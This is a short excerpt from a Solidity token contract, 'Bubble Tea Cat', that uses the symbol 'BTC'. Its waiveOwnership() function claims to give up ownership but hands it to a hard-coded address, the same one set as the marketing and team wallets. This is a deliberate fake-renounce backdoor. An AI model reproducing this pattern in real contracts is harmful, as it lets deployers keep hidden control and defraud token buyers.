...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x5472A05344d92147DF78ffeE1aaD878dB741325D);
    }
...
contract Bubbleteacat is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Bubble Tea Cat";
    string private _symbol = "BTC";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x5472A05344d92147DF78ffeE1aaD878dB741325D);
    address payable public teamWalletAddress = payable(0x5472A05344d92147DF78ffeE1aaD878dB741325D);
